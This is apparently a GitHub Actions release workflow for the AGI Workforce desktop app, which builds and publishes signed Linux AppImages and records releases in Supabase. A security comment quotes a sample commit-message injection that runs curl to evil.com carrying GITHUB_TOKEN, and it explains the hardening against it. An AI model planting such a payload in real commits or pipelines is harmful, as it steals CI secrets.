name: Release Desktop

# ============================================================================
# LINUX-ONLY RELEASE (per Wave 1 task #10 P1-25, 2026-05-08)
#
# This workflow ships Linux .AppImage / .deb bundles only. macOS and Windows
# build jobs were previously present but disabled with `if: false` because:
#
#   - macOS: the six APPLE_* signing secrets (APPLE_CERTIFICATE,
#     APPLE_CERTIFICATE_PASSWORD, APPLE_SIGNING_IDENTITY, APPLE_ID,
#     APPLE_PASSWORD, APPLE_TEAM_ID) are not configured in repo settings.
#     The Developer ID cert itself still exists locally (last shipped
#     v1.1.6 on 2026-03-07); it just needs to be re-exported and uploaded.
#   - Windows: the SSL.com EV cert ($249/yr) is not paid for v1.x. The
#     libsqlite3-sys 0.30.1 + windows-latest OpenSSL pathing also needs
#     fixing — but there's no point until the EV cert lands.
#
# Rather than ship runtime-skipped placeholders that confused readers,
# the gated jobs were deleted in this commit. To re-enable a target:
#
#   - macOS: add the APPLE_* secrets, then restore the `build-macos` and
#     `windows-smoke`-equivalent jobs and append `build-macos` to the
#     `needs:` list of `update-database` and `publish-release`.
#   - Windows: ship the EV cert, fix OpenSSL_DIR on windows-latest, then
#     restore `windows-smoke` + `build-windows` and append to the same
#     `needs:` lists.
#
# /download advertises web + CLI as macOS/Windows alternatives until then.
# ============================================================================

on:
  push:
    tags:
      - 'v*'
  workflow_dispatch:
    inputs:
      version:
        description: 'Version to release (e.g., 1.0.5)'
        required: false
        type: string
      prerelease:
        description: 'Mark as pre-release'
        required: false
        type: boolean
        default: false
      channel:
        description: 'Release channel'
        required: false
        type: choice
        options:
          - stable
          - beta
          - nightly
        default: stable

permissions:
  contents: read

env:
  RUST_VERSION: '1.94.0'
  NODE_VERSION: '22'
  PNPM_VERSION: '9.15.3'

jobs:
  # ==========================================================================
  # Prepare Release - Extract version, generate changelog, create draft release
  # ==========================================================================
  prepare-release:
    name: Prepare Release
    runs-on: ubuntu-latest
    permissions:
      contents: write
    outputs:
      release_id: ${{ steps.create-release.outputs.release_id }}
      version: ${{ steps.get-version.outputs.version }}
      tag: ${{ steps.get-version.outputs.tag }}
      channel: ${{ steps.get-version.outputs.channel }}
      prerelease: ${{ steps.get-version.outputs.prerelease }}
    steps:
      - name: Checkout code
        uses: actions/checkout@v6
        with:
          fetch-depth: 0

      - name: Get version info
        id: get-version
        run: |
          if [ "${{ github.event_name }}" == "workflow_dispatch" ] && [ -n "${{ inputs.version }}" ]; then
            VERSION="${{ inputs.version }}"
            TAG="v${VERSION}"
            CHANNEL="${{ inputs.channel }}"
            PRERELEASE="${{ inputs.prerelease }}"
          else
            TAG="${GITHUB_REF#refs/tags/}"
            # Tag formats supported:
            #   v1.2.0           -> VERSION=1.2.0  (legacy tags)
            #   v-desktop-1.2.0  -> VERSION=1.2.0  (current desktop tags)
            #   v-cli-1.0.0      -> VERSION=1.0.0  (cli tags, separate workflow)
            VERSION=$(echo "$TAG" | sed -E 's/^v(-[a-z]+)?-?//')
            CHANNEL="stable"
            PRERELEASE="false"

            # Check if version contains pre-release identifiers
            if [[ "$VERSION" == *"-beta"* ]] || [[ "$VERSION" == *"-rc"* ]]; then
              PRERELEASE="true"
              CHANNEL="beta"
            elif [[ "$VERSION" == *"-alpha"* ]] || [[ "$VERSION" == *"-nightly"* ]]; then
              PRERELEASE="true"
              CHANNEL="nightly"
            fi
          fi

          echo "version=${VERSION}" >> $GITHUB_OUTPUT
          echo "tag=${TAG}" >> $GITHUB_OUTPUT
          echo "channel=${CHANNEL}" >> $GITHUB_OUTPUT
          echo "prerelease=${PRERELEASE}" >> $GITHUB_OUTPUT

          echo "Version: ${VERSION}"
          echo "Tag: ${TAG}"
          echo "Channel: ${CHANNEL}"
          echo "Pre-release: ${PRERELEASE}"

      - name: Generate changelog
        id: changelog
        run: |
          # Get previous tag
          PREV_TAG=$(git describe --tags --abbrev=0 HEAD^ 2>/dev/null || echo "")

          if [ -z "$PREV_TAG" ]; then
            CHANGELOG="Initial release"
          else
            # Generate changelog from commits
            CHANGELOG=$(git log --pretty=format:"- %s (%h)" ${PREV_TAG}..HEAD -- apps/desktop/ | head -50)

            if [ -z "$CHANGELOG" ]; then
              CHANGELOG="Bug fixes and improvements"
            fi
          fi

          # Use heredoc syntax for multi-line output
          {
            echo "changelog<<CHANGELOG_EOF"
            echo "$CHANGELOG"
            echo "CHANGELOG_EOF"
          } >> $GITHUB_OUTPUT

      - name: Create draft release
        id: create-release
        uses: actions/github-script@v8
        env:
          VERSION: ${{ steps.get-version.outputs.version }}
          TAG: ${{ steps.get-version.outputs.tag }}
          PRERELEASE: ${{ steps.get-version.outputs.prerelease }}
          CHANNEL: ${{ steps.get-version.outputs.channel }}
          # SECURITY (C1, redteam-services 2026-05-04): Pass changelog via env, NEVER
          # via ${{ ... }} interpolation in the script body. Commit subjects flow
          # into this string from `git log` and an attacker could craft
          # `feat: x ${require('child_process').execSync('curl evil.com?t='+process.env.GITHUB_TOKEN)}`
          # which would execute on the runner with secrets exposed (TAURI_*, SUPABASE_*, APPLE_*).
          # Reading from process.env keeps the value as a plain string — JS template
          # literal evaluation only happens against the literal text we author below.
          CHANGELOG: ${{ steps.changelog.outputs.changelog }}
        with:
          script: |
            const version = process.env.VERSION;
            const tag = process.env.TAG;
            const prerelease = process.env.PRERELEASE === 'true';
            const channel = process.env.CHANNEL;
            const changelog = process.env.CHANGELOG ?? '';

            const channelBadge = channel !== 'stable' ? ` [${channel.toUpperCase()}]` : '';

            const releaseBody = `## AGI Workforce ${version}${channelBadge}

            ### What's New

            ${changelog}

            ### Downloads

            | Platform | Architecture | Download |
            |----------|--------------|----------|
            | macOS | Apple Silicon (M1/M2/M3) | _Available in v1.2.1_ — see https://agiworkforce.com/chat in the meantime |
            | macOS | Intel | _Available in v1.2.1_ |
            | Windows | x64 | _Coming Q3 2026_ — use the web app at https://agiworkforce.com/chat or install the CLI |
            | Linux | x64 | \`AGI.Workforce_${version}_amd64.AppImage\` |

            ### Installation

            **macOS:** The signed \`.dmg\` is being rebuilt for v1.2.1 (code-signing pipeline is being reconfigured). The web app at https://agiworkforce.com/chat works in any browser today.

            **Windows:** The native installer is not available yet (planned Q3 2026). In the meantime, the web app at https://agiworkforce.com/chat works in any browser, and the CLI installs via \`cargo install agiworkforce-cli\`.

            **Linux:** Download the \`.AppImage\`, make it executable (\`chmod +x\`), and run it.

            ### Auto-Updates

            Existing installations will automatically update to this version.

            ---

            **Full Changelog:** https://github.com/${context.repo.owner}/${context.repo.repo}/compare/v${version}...HEAD
            `;

            const { data } = await github.rest.repos.createRelease({
              owner: context.repo.owner,
              repo: context.repo.repo,
              tag_name: tag,
              name: `AGI Workforce v${version}${channelBadge}`,
              body: releaseBody,
              draft: true,
              prerelease: prerelease
            });

            core.setOutput('release_id', data.id);
            return data.id;

  # ==========================================================================
  # Validate - Lint, type check, and test before build
  # ==========================================================================
  validate:
    needs: [prepare-release]
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - name: Checkout repository
        uses: actions/checkout@v6
      - name: Setup pnpm
        uses: pnpm/action-setup@a8198c4bff370c8506180b035930dea56dbd5288 # v5
        with:
          version: 9.15.3
      - name: Setup Node.js
        uses: actions/setup-node@v6
        with:
          node-version: '22'
          cache: 'pnpm'
      - name: Install dependencies
        run: pnpm install --frozen-lockfile
      - name: Lint
        run: pnpm lint
      - name: Type check
        run: pnpm typecheck:all
      - name: Test
        run: pnpm test

  # ==========================================================================
  # Build Linux - x86_64 AppImage
  # ==========================================================================
  build-linux:
    name: Build Linux
    needs: [prepare-release, validate]
    runs-on: ubuntu-22.04
    permissions:
      contents: write
    timeout-minutes: 60
    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Setup pnpm
        uses: pnpm/action-setup@a8198c4bff370c8506180b035930dea56dbd5288 # v5
        with:
          version: ${{ env.PNPM_VERSION }}

      - name: Setup Node.js
        uses: actions/setup-node@v6
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'pnpm'

      - name: Setup Rust
        uses: actions-rust-lang/setup-rust-toolchain@1fbea72663f6d4c03efaab13560c8a24cfd2a7cc # v1.9.0
        with:
          toolchain: ${{ env.RUST_VERSION }}

      - name: Install Linux dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            libwebkit2gtk-4.1-dev \
            build-essential \
            curl \
            wget \
            file \
            libxdo-dev \
            libssl-dev \
            libayatana-appindicator3-dev \
            librsvg2-dev \
            pkg-config \
            libleptonica-dev \
            libpng-dev \
            libjpeg-dev \
            libtiff-dev \
            zlib1g-dev \
            libwebp-dev \
            libasound2-dev \
            libclang-dev

      - name: Cache Rust dependencies
        uses: Swatinem/rust-cache@23869a5bd66c73db3c0ac40331f3206eb23791dc # v2.9.1
        with:
          workspaces: apps/desktop/src-tauri
          cache-on-failure: true

      - name: Install JavaScript dependencies
        run: pnpm install --frozen-lockfile

      # C1: Mask signing secrets in logs before they reach the build step
      - name: Mask Tauri signing secrets
        run: |
          echo "::add-mask::${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}"
          echo "::add-mask::${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}"

      - name: Build web frontend
        # H27: --max-old-space-size=8192 is intentional; ubuntu-22.04 runners have 7 GB RAM
        run: echo "NODE_OPTIONS=--max-old-space-size=8192" >> $GITHUB_ENV && pnpm --filter @agiworkforce/desktop run build:web

      - name: Build Tauri app
        # H28: Pinned to @v0 major-version tag (commit 73fb865 = v0.6.1); avoids floating SHA
        # C1: Signing keys are masked above; passed via env: (tauri-action reads TAURI_SIGNING_* from env)
        uses: tauri-apps/tauri-action@84b9d35b5fc46c1e45415bdb6144030364f7ebc5 # v0.6.2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
          CI: 'true'
        with:
          releaseId: ${{ needs.prepare-release.outputs.release_id }}

      - name: Upload build artifacts
        uses: actions/upload-artifact@v7
        with:
          name: linux-x64-artifacts
          path: |
            apps/desktop/src-tauri/target/release/bundle/appimage/*.AppImage
            apps/desktop/src-tauri/target/release/bundle/appimage/*.AppImage.tar.gz
            apps/desktop/src-tauri/target/release/bundle/appimage/*.AppImage.tar.gz.sig
          retention-days: 7

  # ==========================================================================
  # Update Release Database - Store release info in Supabase
  # ==========================================================================
  update-database:
    name: Update Release Database
    needs: [prepare-release, build-linux]
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v6

      - name: Setup Node.js
        uses: actions/setup-node@v6
        with:
          node-version: ${{ env.NODE_VERSION }}

      - name: Download all artifacts
        uses: actions/download-artifact@v8
        with:
          path: artifacts

      - name: Mask sensitive secrets
        run: |
          echo "::add-mask::${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}"

      - name: Update release database
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_ROLE_KEY: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
          VERSION: ${{ needs.prepare-release.outputs.version }}
          CHANNEL: ${{ needs.prepare-release.outputs.channel }}
          PRERELEASE: ${{ needs.prepare-release.outputs.prerelease }}
          GITHUB_REPO: ${{ github.repository }}
        run: |
          PUB_DATE=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
          BASE_URL="https://github.com/${GITHUB_REPO}/releases/download/v${VERSION}"
          IS_PRERELEASE=$( [ "${PRERELEASE}" = "true" ] && echo "true" || echo "false" )

          # Call Supabase RPC endpoint directly via curl (no npm install needed)
          upsert_release() {
            local platform="$1" download_url="$2" signature="$3" file_size="$4"
            local response
            response=$(curl -sf -X POST \
              "${SUPABASE_URL}/rest/v1/rpc/upsert_release" \
              -H "apikey: ${SUPABASE_SERVICE_ROLE_KEY}" \
              -H "Authorization: Bearer ${SUPABASE_SERVICE_ROLE_KEY}" \
              -H "Content-Type: application/json" \
              -d "{
                \"p_version\": \"${VERSION}\",
                \"p_platform\": \"${platform}\",
                \"p_download_url\": \"${download_url}\",
                \"p_signature\": \"${signature}\",
                \"p_notes\": null,
                \"p_pub_date\": \"${PUB_DATE}\",
                \"p_file_size_bytes\": ${file_size},
                \"p_is_prerelease\": ${IS_PRERELEASE},
                \"p_is_critical\": false,
                \"p_channel\": \"${CHANNEL}\"
              }")
            if [ $? -eq 0 ]; then
              echo "Updated release for ${platform}: ${VERSION}"
            else
              echo "Failed to upsert release for ${platform}: ${response}" >&2
            fi
          }

          # Platform mapping: artifact_dir platform extension
          PLATFORMS="
          macos-universal-artifacts darwin-universal .app.tar.gz
          macos-aarch64-artifacts darwin-aarch64 .app.tar.gz
          macos-x86_64-artifacts darwin-x86_64 .app.tar.gz
          windows-x64-artifacts windows-x86_64 .nsis.zip
          linux-x64-artifacts linux-x86_64 .AppImage.tar.gz
          "

          echo "$PLATFORMS" | while read -r dir platform ext; do
            [ -z "$dir" ] && continue
            artifact_path="artifacts/${dir}"

            if [ ! -d "$artifact_path" ]; then
              echo "No artifacts found for ${platform}"
              continue
            fi

            # Find first matching file (excluding .sig files)
            file_path=$(find "$artifact_path" -name "*${ext}" ! -name "*.sig" -type f | head -1)
            if [ -z "$file_path" ]; then
              echo "No artifacts found for ${platform}"
              continue
            fi

            file_name=$(basename "$file_path")
            sig_path="${file_path}.sig"

            if [ ! -f "$sig_path" ]; then
              echo "Signature not found for ${platform}: ${sig_path}" >&2
              continue
            fi

            signature=$(cat "$sig_path" | tr -d '\n')
            file_size=$(stat -c%s "$file_path" 2>/dev/null || stat -f%z "$file_path")
            download_url="${BASE_URL}/${file_name}"

            upsert_release "$platform" "$download_url" "$signature" "$file_size"
          done

  # ==========================================================================
  # Publish Release - Make the release public
  # ==========================================================================
  publish-release:
    name: Publish Release
    needs: [prepare-release, build-linux, update-database]
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Publish release
        uses: actions/github-script@v8
        env:
          # SECURITY (C1 hardening): pass release_id via env to keep the github-script
          # body free of ${{ }} interpolation. release_id originates from a GitHub API
          # response (numeric) so it is safer than user-controlled changelog text, but
          # we use the same pattern here for consistency and defense-in-depth.
          RELEASE_ID: ${{ needs.prepare-release.outputs.release_id }}
        with:
          script: |
            const releaseId = Number(process.env.RELEASE_ID);
            if (!Number.isInteger(releaseId) || releaseId <= 0) {
              throw new Error(`Invalid release_id: ${process.env.RELEASE_ID}`);
            }
            await github.rest.repos.updateRelease({
              owner: context.repo.owner,
              repo: context.repo.repo,
              release_id: releaseId,
              draft: false
            });

            console.log('Release published successfully!');

      - name: Notify on success
        if: success()
        run: |
          echo "Release v${{ needs.prepare-release.outputs.version }} published successfully!"
          echo "Channel: ${{ needs.prepare-release.outputs.channel }}"
          echo "Pre-release: ${{ needs.prepare-release.outputs.prerelease }}"

  # ==========================================================================
  # Cleanup on Failure
  # ==========================================================================
  cleanup-on-failure:
    name: Cleanup Failed Release
    needs: [prepare-release, build-linux]
    if: failure()
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Delete draft release
        uses: actions/github-script@v8
        env:
          # SECURITY (C1 hardening): same env-passthrough pattern.
          RELEASE_ID: ${{ needs.prepare-release.outputs.release_id }}
        with:
          script: |
            const raw = process.env.RELEASE_ID;
            const releaseId = raw ? Number(raw) : 0;

            if (Number.isInteger(releaseId) && releaseId > 0) {
              try {
                await github.rest.repos.deleteRelease({
                  owner: context.repo.owner,
                  repo: context.repo.repo,
                  release_id: releaseId
                });
                console.log('Draft release deleted due to build failure');
              } catch (error) {
                console.warn('Failed to delete draft release:', error.message);
              }
            }

      - name: Notify on failure
        run: |
          echo "Release build failed for v${{ needs.prepare-release.outputs.version }}"
          echo "Draft release has been cleaned up"
